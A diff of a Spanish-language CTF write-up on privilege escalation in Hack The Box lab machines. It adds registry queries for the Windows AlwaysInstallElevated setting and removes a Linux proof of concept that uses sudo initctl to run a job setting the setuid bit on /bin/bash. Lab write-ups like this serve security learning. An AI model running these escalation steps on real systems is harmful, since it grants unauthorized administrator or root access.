@@ -12,33 +12,34 @@ En la fase de busqueda de privilegias, WinPeas nos presenta el siguiente setting
 
 ![Love HTB Escalando Privilegio ](/assets/images/love-1.png)
 
+Este key registry significa que cualquier usuario puede instalar un archivo .msi con privilegios de NT Authority\System.
+
+<h2>Enumeracion Manual</h2>
+
+Puedes hacer la solicitud al registro de manera manual con los siguientes comandos:
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+el regultado de ambos query debe devolver el valor 1, es decir (value is 0x1).
+
+
+
 <h2>Initctl</h2>
 
 
-![ Spectra HTB Escalando Privilegio ](/assets/images/Image 2.png)
+
 
 <h2> ¿Qué hago ahora? </h2>
  
 
-{% highlight bash %} sudo -u root /usr/bin/initctl {% endhighlight %}
 
-![ Spectra HTB Escalando Privilegio ](/assets/images/Image 1.png)
+
 
 <h2>PoC</h2>
 
 
-{% highlight bash %}
-script
-    chmod u+s /bin/bash
-end script
-{% endhighlight %}
 
--[+] Guardamos e iniciamos nuestro *test.conf*
- 
-{% highlight bash %} sudo -u root /usr/bin/initctl start test {% endhighlight %}
 
--[+] Listamos permisos de la /bin/bash `ls -la /bin/bash`
-
-![ Spectra HTB Escalando Privilegio ](/assets/images/Image 4.png)
 
 🖱️_by:_ *@DaVinciRoot*
